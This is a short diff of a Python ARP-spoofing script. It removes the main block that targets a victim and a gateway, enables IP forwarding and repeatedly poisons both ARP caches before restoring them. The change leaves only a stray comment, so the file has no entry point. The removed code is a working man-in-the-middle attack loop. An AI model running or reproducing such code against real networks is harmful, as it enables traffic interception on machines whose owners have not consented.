@@ -82,22 +82,6 @@ def restore(target_ip, host_ip, verbose=True):
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac)) 
 
 
-if __name__ == "__main__":
+
     # victim ip address
-    target = "192.168.1.4"
-    # gateway ip address
-    host = "192.168.1.1"
-    # print progress to the screen
-    verbose = True
-    # enable ip forwarding
-    enable_ip_route()
-    try:
-        while True:
-            spoof(target, host, verbose)
-            spoof(host, target, verbose)
-            # sleep for one second
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("[!] Detected CTRL+C ! restoring the network, please wait...")
-        restore(target, host)
-        restore(host, target)                   
+                  
